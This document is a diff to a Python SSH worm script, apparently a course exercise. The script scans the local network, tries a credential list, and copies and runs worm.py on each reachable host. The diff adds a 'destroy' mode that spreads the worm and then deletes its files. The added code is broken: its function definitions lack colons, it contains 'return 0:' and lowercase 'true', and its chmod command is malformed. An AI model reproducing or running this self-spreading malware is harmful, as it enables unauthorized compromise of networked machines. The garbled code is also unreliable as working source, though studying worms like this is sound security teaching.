@@ -6,7 +6,7 @@ import nmap
 import netinfo
 import os
 import logging
-
+import os.path
 
 # The list of credentials to attempt
 credList = [
@@ -19,6 +19,22 @@ credList = [
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
+
+### ---[[ Delete Worm Dependencies]]-- ###
+
+def spreadAndExecuteArgs(ssHInfo)
+        if (sys.argv[0] == "destroy") :
+                spreadAndExecute(ssHInfo, true)
+                removeWormRec()
+        else:
+                spreadAndExecute(ssHInfo, false)
+        return 0:
+
+def removeWormRec()
+        os.remove("/tmp/infected.txt")
+        os.remove("/tmp/worm.py")
+        return 0:
+
 ##################################################################
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
@@ -28,7 +44,9 @@ def isInfectedSystem(sftp,remote,local):
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
-	# as infected). 
+	# as infected).
+
+	
 	try:
 		sftp.stat('/tmp/infected.txt')
 		print 'its not stat'
@@ -58,7 +76,7 @@ def markInfected():
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
 ###############################################################
-def spreadAndExecute(sshClient):
+def spreadAndExecute(sshClient, Destroy):
 	
 	# This function takes as a parameter 
 	# an instance of the SSH class which
@@ -72,6 +90,9 @@ def spreadAndExecute(sshClient):
 	# is very similar to that code.	
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("worm.py", "/tmp/" + "worm.py")
+	if (Destroy):
+             sshClient.exec_command("chmod a+x /tmp/worm.py -destroy")
+             return 0
 	sshClient.exec_command("chmod a+x /tmp/worm.py")
 
 def getHostsOnTheSameNetwork():
@@ -307,7 +328,7 @@ for host in networkHosts:
 		sftp = sshInfo.open_sftp()
 		
 		if not (isInfectedSystem(sftp, remotepath, localpath)):
-			spreadAndExecute(sshInfo)
+			spreadAndExecuteArgs(sshInfo)
 			std_in, std_out, std_err =sshInfo.exec_command("python '/tmp/worm.py'")
 			print(std_out.read())
 			
